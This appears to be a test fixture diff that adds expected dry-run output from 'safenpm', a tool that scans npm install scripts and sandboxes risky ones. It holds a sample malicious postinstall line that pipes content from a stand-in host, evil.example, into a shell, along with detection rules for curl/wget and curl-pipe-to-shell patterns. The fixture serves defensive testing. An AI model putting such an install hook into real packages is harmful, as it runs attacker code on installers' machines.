@@ -1,0 +1,23 @@
+
+[1m  safenpm[0m [2m— dry run (no scripts will be executed)[0m
+
+[2m  sandbox: sandbox-exec (macOS)[0m
+[2m  allowlist: 1 package whitelisted[0m
+[36m  →[0m would run: npm install --ignore-scripts
+
+[36m  →[0m static analysis of install scripts...
+
+  [31m⚠[0m [1mphone-home@0.0.1[0m [2mrisk: 60/100[0m
+    [31mHIGH  [0m Uses curl/wget to fetch remote content
+    [31mHIGH  [0m Pipes remote content to shell (curl | sh pattern)
+
+[36m  →[0m 2 install scripts found in node_modules:
+
+  [34mallow[0m  [1mbuild-tool@3.0.0[0m
+[2m          [install] echo building[0m
+  [33msandbox[0m  [1mphone-home@0.0.1[0m
+[2m          [postinstall] curl https://evil.example/data | sh[0m
+
+[2m  1 would be sandboxed, 1 would be allowlisted[0m
+[2m  run without --dry-run to execute[0m
+EXITCODE:0
